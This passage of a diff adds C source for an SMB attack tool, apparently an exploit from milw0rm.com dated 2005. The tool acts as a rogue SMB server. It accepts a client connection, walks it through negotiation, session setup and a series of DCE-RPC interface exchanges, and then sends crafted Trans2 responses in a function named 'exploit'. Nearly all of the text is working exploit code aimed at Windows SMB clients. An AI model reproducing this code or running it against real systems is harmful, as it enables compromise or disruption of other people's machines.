+				{ srv++; j = 1; }
+			if ( ( str[120 + i] + 0x100 ) == spl_uuid[i] )
+				{ spl++; j = 1; }
+			if ( ( str[120 + i] + 0x100 ) == wrg_uuid[i] )
+				{ wrg++; j = 1; }
+			if ( j == 0 )
+				foo++;
+		}
+		else
+		{
+			if ( str[120 + i] == wks_uuid[i] )
+				{ wks++; j = 1; }
+			if ( str[120 + i] == srv_uuid[i] )
+				{ srv++; j = 1; }
+			if ( str[120 + i] == spl_uuid[i] )
+				{ spl++; j = 1; }
+			if ( str[120 + i] == wrg_uuid[i] )
+				{ wrg++; j = 1; }
+			if ( j == 0 )
+				foo++;
+		}
+	}
+	if ( wks == 16 )
+		return ( 0 );
+	else if ( srv == 16 )
+		return ( 1 );
+	else if ( spl == 16 )
+		return ( 2 );
+	else if ( wrg == 16 )
+		return ( 3 );
+	else
+	{
+		printf ( "there is/are %d invalid byte(s) in the interface UUID!\n", foo );
+		return ( -1 );
+	}
+}
+
+void
+neg ( int s )
+{
+	char response[1024];
+
+	bzero ( &response, sizeof ( response ) );
+	recv ( s, response, sizeof ( response ) -1, 0 );
+
+	send ( s, SmbNeg, sizeof ( SmbNeg ) -1, 0 );
+}
+
+void
+sessionsetup ( int s, unsigned long userid, unsigned long treeid, int option )
+{
+	char response[1024];
+	unsigned char ntlm_challenge1[] = "\xa2\x75\x1b\x10\xe7\x62\xb0\xc3";
+	unsigned char ntlm_challenge2[] = "\xe1\xed\x43\x66\xc7\xa7\x36\xbd";
+
+	bzero ( &response, sizeof ( response ) );
+	recv ( s, response, sizeof ( response ) -1, 0 );
+
+	printf ( "SessionSetupAndXNeg\n" );
+	SessionSetupAndXNeg[30] = response[30];
+	SessionSetupAndXNeg[31] = response[31];
+	SessionSetupAndXNeg[34] = response[34];
+	SessionSetupAndXNeg[35] = response[35];
+
+	strncpy ( SessionSetupAndXNeg + 32, ( unsigned char* ) &userid, 2 );
+	if ( option == 0 )
+		memcpy ( SessionSetupAndXNeg + 71, ntlm_challenge1, 8 );
+	else
+		memcpy ( SessionSetupAndXNeg + 71, ntlm_challenge2, 8 );
+
+	send ( s, SessionSetupAndXNeg, sizeof ( SessionSetupAndXNeg ) -1, 0 );
+
+	bzero ( &response, sizeof ( response ) );
+	recv ( s, response, sizeof ( response ) -1, 0 );
+
+	printf ( "SessionSetupAndXAuth\n" );
+	SessionSetupAndXAuth[30] = response[30];
+	SessionSetupAndXAuth[31] = response[31];
+	SessionSetupAndXAuth[34] = response[34];
+	SessionSetupAndXAuth[35] = response[35];
+
+	strncpy ( SessionSetupAndXAuth + 32, ( unsigned char* ) &userid, 2 );
+
+	send ( s, SessionSetupAndXAuth, sizeof ( SessionSetupAndXAuth ) -1, 0 );
+
+	bzero ( &response, sizeof ( response ) );
+	recv ( s, response, sizeof ( response ) -1, 0 );
+
+	printf ( "TreeConnectAndX\n" );
+	TreeConnectAndX[30] = response[30];
+	TreeConnectAndX[31] = response[31];
+	TreeConnectAndX[34] = response[34];
+	TreeConnectAndX[35] = response[35];
+
+	strncpy ( TreeConnectAndX + 28, ( unsigned char* ) &treeid, 2 );
+	strncpy ( TreeConnectAndX + 32, ( unsigned char* ) &userid, 2 );
+
+	send ( s, TreeConnectAndX, sizeof ( TreeConnectAndX ) -1, 0 );
+}
+
+void
+digg ( int s, unsigned long fid, unsigned long assocgroup, unsigned long userid, unsigned long treeid, int option )
+{
+	int ret;
+	char response[1024];
+	unsigned char srv[] = "\x73\x72\x76";
+	unsigned char wks[] = "\x77\x6b\x73";
+
+	bzero ( &response, sizeof ( response ) );
+	recv ( s, response, sizeof ( response ) -1, 0 );
+
+	printf ( "SmbNtCreate\n" );
+	SmbNtCreate[30] = response[30];
+	SmbNtCreate[31] = response[31];
+	SmbNtCreate[34] = response[34];
+	SmbNtCreate[35] = response[35];
+
+	strncpy ( SmbNtCreate + 28, ( unsigned char* ) &treeid, 2 );
+	strncpy ( SmbNtCreate + 32, ( unsigned char* ) &userid, 2 );
+	strncpy ( SmbNtCreate + 42, ( unsigned char* ) &fid, 2 );
+
+	send ( s, SmbNtCreate, sizeof ( SmbNtCreate ) -1, 0 );
+
+	bzero ( &response, sizeof ( response ) );
+	recv ( s, response, sizeof ( response ) -1, 0 );
+
+	printf ( "DceRpc\n" );
+	DceRpc[30] = response[30];
+	DceRpc[31] = response[31];
+	DceRpc[34] = response[34];
+	DceRpc[35] = response[35];
+
+	strncpy ( DceRpc + 28, ( unsigned char* ) &treeid, 2 );
+	strncpy ( DceRpc + 32, ( unsigned char* ) &userid, 2 );
+	strncpy ( DceRpc + 80, ( unsigned char* ) &assocgroup, 2 );
+
+	ret = check_interface ( response );
+	if ( ret == 0 )
+		memcpy ( DceRpc + 92, wks, 3 );
+	else if ( ret == 1 )
+		memcpy ( DceRpc + 92, srv, 3 );
+	else if ( ret == 2 );
+	else if ( ret == 3 );
+	else
+	{
+		printf ( "invalid interface uuid, aborting...\n" );
+		exit ( 1 );
+	}
+
+	send ( s, DceRpc, sizeof ( DceRpc ) -1, 0 );
+
+	bzero ( &response, sizeof ( response ) );
+	recv ( s, response, sizeof ( response ) -1, 0 );
+
+	if ( option == 1 )
+	{
+		printf ( "NetrShareEnum\n" );
+		NetrShareEnum[30] = response[30];
+		NetrShareEnum[31] = response[31];
+		NetrShareEnum[34] = response[34];
+		NetrShareEnum[35] = response[35];
+
+		strncpy ( NetrShareEnum + 28, ( unsigned char* ) &treeid, 2 );
+		strncpy ( NetrShareEnum + 32, ( unsigned char* ) &userid, 2 );
+
+		send ( s, NetrShareEnum, sizeof ( NetrShareEnum ) -1, 0 );
+	}
+	else if ( ( option == 2 ) && ( ret == 2 ) )
+	{
+		printf ( "OpenPrinterEx\n" );
+		OpenPrinterEx[30] = response[30];
+		OpenPrinterEx[31] = response[31];
+		OpenPrinterEx[34] = response[34];
+		OpenPrinterEx[35] = response[35];
+
+		strncpy ( OpenPrinterEx + 28, ( unsigned char* ) &treeid, 2 );
+		strncpy ( OpenPrinterEx + 32, ( unsigned char* ) &userid, 2 );
+
+		send ( s, OpenPrinterEx, sizeof ( OpenPrinterEx ) -1, 0 );
+
+		bzero ( &response, sizeof ( response ) );
+		recv ( s, response, sizeof ( response ) -1, 0 );
+
+		printf ( "ClosePrinter\n" );
+		ClosePrinter[30] = response[30];
+		ClosePrinter[31] = response[31];
+		ClosePrinter[34] = response[34];
+		ClosePrinter[35] = response[35];
+
+		strncpy ( ClosePrinter + 28, ( unsigned char* ) &treeid, 2 );
+		strncpy ( ClosePrinter + 32, ( unsigned char* ) &userid, 2 );
+
+		send ( s, ClosePrinter, sizeof ( ClosePrinter ) -1, 0 );
+	}
+	else if ( ( option == 3 ) && ( ret == 3 ) )
+	{
+		printf ( "OpenHklm\n" );
+		OpenHklm[30] = response[30];
+		OpenHklm[31] = response[31];
+		OpenHklm[34] = response[34];
+		OpenHklm[35] = response[35];
+
+		strncpy ( OpenHklm + 28, ( unsigned char* ) &treeid, 2 );
+		strncpy ( OpenHklm + 32, ( unsigned char* ) &userid, 2 );
+
+		send ( s, OpenHklm, sizeof ( OpenHklm ) -1, 0 );
+
+		bzero ( &response, sizeof ( response ) );
+		recv ( s, response, sizeof ( response ) -1, 0 );
+
+		printf ( "OpenKey\n" );
+		OpenKey[30] = response[30];
+		OpenKey[31] = response[31];
+		OpenKey[34] = response[34];
+		OpenKey[35] = response[35];
+
+		strncpy ( OpenKey + 28, ( unsigned char* ) &treeid, 2 );
+		strncpy ( OpenKey + 32, ( unsigned char* ) &userid, 2 );
+
+		send ( s, OpenKey, sizeof ( OpenKey ) -1, 0 );
+
+		bzero ( &response, sizeof ( response ) );
+		recv ( s, response, sizeof ( response ) -1, 0 );
+
+		printf ( "CloseKey\n" );
+		CloseKey[30] = response[30];
+		CloseKey[31] = response[31];
+		CloseKey[34] = response[34];
+		CloseKey[35] = response[35];
+
+		strncpy ( CloseKey + 28, ( unsigned char* ) &treeid, 2 );
+		strncpy ( CloseKey + 32, ( unsigned char* ) &userid, 2 );
+
+		send ( s, CloseKey, sizeof ( CloseKey ) -1, 0 );
+	}
+	else if ( option == 4 )
+	{
+		printf ( "NetBios1\n" );
+		NetBios1[30] = response[30];
+		NetBios1[31] = response[31];
+		NetBios1[34] = response[34];
+		NetBios1[35] = response[35];
+
+		strncpy ( NetBios1 + 28, ( unsigned char* ) &treeid, 2 );
+		strncpy ( NetBios1 + 32, ( unsigned char* ) &userid, 2 );
+
+		send ( s, NetBios1, sizeof ( NetBios1 ) -1, 0 );
+	}
+	else
+	{
+		if ( ret == 0 )
+		{
+			printf ( "WksSvc\n" );
+			WksSvc[30] = response[30];
+			WksSvc[31] = response[31];
+			WksSvc[34] = response[34];
+			WksSvc[35] = response[35];
+
+			strncpy ( WksSvc + 28, ( unsigned char* ) &treeid, 2 );
+			strncpy ( WksSvc + 32, ( unsigned char* ) &userid, 2 );
+
+			send ( s, WksSvc, sizeof ( WksSvc ) -1, 0 );
+		}
+		else
+		{
+			printf ( "SrvSvc\n" );
+			SrvSvc[30] = response[30];
+			SrvSvc[31] = response[31];
+			SrvSvc[34] = response[34];
+			SrvSvc[35] = response[35];
+
+			strncpy ( SrvSvc + 28, ( unsigned char* ) &treeid, 2 );
+			strncpy ( SrvSvc + 32, ( unsigned char* ) &userid, 2 );
+
+			send ( s, SrvSvc, sizeof ( SrvSvc ) -1, 0 );
+		}
+	}
+
+	bzero ( &response, sizeof ( response ) );
+	recv ( s, response, sizeof ( response ) -1, 0 );
+
+	printf ( "SmbClose\n" );
+	SmbClose[30] = response[30];
+	SmbClose[31] = response[31];
+	SmbClose[34] = response[34];
+	SmbClose[35] = response[35];
+
+	strncpy ( SmbClose + 28, ( unsigned char* ) &treeid, 2 );
+	strncpy ( SmbClose + 32, ( unsigned char* ) &userid, 2 );
+
+	send ( s, SmbClose, sizeof ( SmbClose ) -1, 0 );
+}
+
+void
+exploit ( int s, unsigned long fid, unsigned long assocgroup, unsigned long userid, unsigned long treeid )
+{
+	char response[1024];
+
+	bzero ( &response, sizeof ( response ) );
+	recv ( s, response, sizeof ( response ) -1, 0 );
+
+	printf ( "NetBios2\n" );
+	NetBios2[30] = response[30];
+	NetBios2[31] = response[31];
+	NetBios2[34] = response[34];
+	NetBios2[35] = response[35];
+
+	strncpy ( NetBios2 + 28, ( unsigned char* ) &treeid, 2 );
+	strncpy ( NetBios2 + 32, ( unsigned char* ) &userid, 2 );
+
+	send ( s, NetBios2, sizeof ( NetBios2 ) -1, 0 );
+
+	bzero ( &response, sizeof ( response ) );
+	recv ( s, response, sizeof ( response ) -1, 0 );
+
+	printf ( "Trans2Response1\n" );
+	Trans2Response1[30] = response[30];
+	Trans2Response1[31] = response[31];
+	Trans2Response1[34] = response[34];
+	Trans2Response1[35] = response[35];
+
+	strncpy ( Trans2Response1 + 28, ( unsigned char* ) &treeid, 2 );
+	strncpy ( Trans2Response1 + 32, ( unsigned char* ) &userid, 2 );
+
+	send ( s, Trans2Response1, sizeof ( Trans2Response1 ) -1, 0 );
+
+	bzero ( &response, sizeof ( response ) );
+	recv ( s, response, sizeof ( response ) -1, 0 );
+
+	printf ( "Trans2Response2\n" );
+	Trans2Response2[30] = response[30];
+	Trans2Response2[31] = response[31];
+	Trans2Response2[34] = response[34];
+	Trans2Response2[35] = response[35];
+
+	strncpy ( Trans2Response2 + 28, ( unsigned char* ) &treeid, 2 );
+	strncpy ( Trans2Response2 + 32, ( unsigned char* ) &userid, 2 );
+
+	send ( s, Trans2Response2, sizeof ( Trans2Response2 ) -1, 0 );
+
+	bzero ( &response, sizeof ( response ) );
+	recv ( s, response, sizeof ( response ) -1, 0 );
+
+	printf ( "Trans2Response3\n" );
+	Trans2Response3[30] = response[30];
+	Trans2Response3[31] = response[31];
+	Trans2Response3[34] = response[34];
+	Trans2Response3[35] = response[35];
+
+	strncpy ( Trans2Response3 + 28, ( unsigned char* ) &treeid, 2 );
+	strncpy ( Trans2Response3 + 32, ( unsigned char* ) &userid, 2 );
+
+	send ( s, Trans2Response3, sizeof ( Trans2Response3 ) -1, 0 );
+}
+
+int
+main ( int argc, char* argv[] )
+{
+	int s1, s2, i;
+	unsigned long fid = 0x1337;
+	unsigned long treeid = 0x0808;
+	unsigned long userid = 0x0808;
+	unsigned long assocgroup = 0x4756;
+	pid_t childpid;
+	socklen_t clilen;
+	struct sockaddr_in cliaddr, servaddr;
+
+	bzero ( &servaddr, sizeof ( servaddr ) );
+	servaddr.sin_family = AF_INET;
+	servaddr.sin_addr.s_addr = htonl ( INADDR_ANY );
+	servaddr.sin_port = htons ( PORT );
+
+	s1 = socket ( AF_INET, SOCK_STREAM, 0 );
+	bind ( s1, ( struct sockaddr * ) &servaddr, sizeof ( servaddr ) );
+	listen ( s1, 1 );
+
+	clilen = sizeof ( cliaddr );
+
+	s2 = accept ( s1, ( struct sockaddr * ) &cliaddr, &clilen );
+
+	close ( s1 );
+
+	printf ( "\n%s\n\n", inet_ntoa ( cliaddr.sin_addr ) );
+
+	neg ( s2 );                                             // Negotiate
+	sessionsetup ( s2, userid, treeid, 0 );                 // SessionSetup
+	for ( i = 0; i < 15; i++ )
+	{
+		digg ( s2, fid, assocgroup, userid, treeid, 0 );
+		fid++;
+		assocgroup ++;
+	}
+	digg ( s2, fid, assocgroup, userid, treeid, 1 );        // NetrShareEnum
+	fid++;
+	assocgroup ++;
+	digg ( s2, fid, assocgroup, userid, treeid, 2 );        // spoolss
+	fid++;
+	assocgroup ++;
+	for ( i = 0; i < 4; i++ )
+	{
+		digg ( s2, fid, assocgroup, userid, treeid, 0 );
+		fid++;
+		assocgroup ++;
+	}
+	digg ( s2, fid, assocgroup, userid, treeid, 3 );         // WinReg
+	userid++;
+	treeid++;
+	sessionsetup ( s2, userid, treeid, 1 );                  // SessionSetup
+	userid--;
+	treeid--;
+	for ( i = 0; i < 2; i++ )
+	{
+		digg ( s2, fid, assocgroup, userid, treeid, 4 );     // NetBios
+		fid++;
+		assocgroup ++;
+	}
+	treeid += 2;
+	exploit ( s2, fid, assocgroup, userid, treeid );
+
+	printf ( "done!\n" );
+
+	close ( s2 );
+}
+
+// milw0rm.com [2005-06-23]
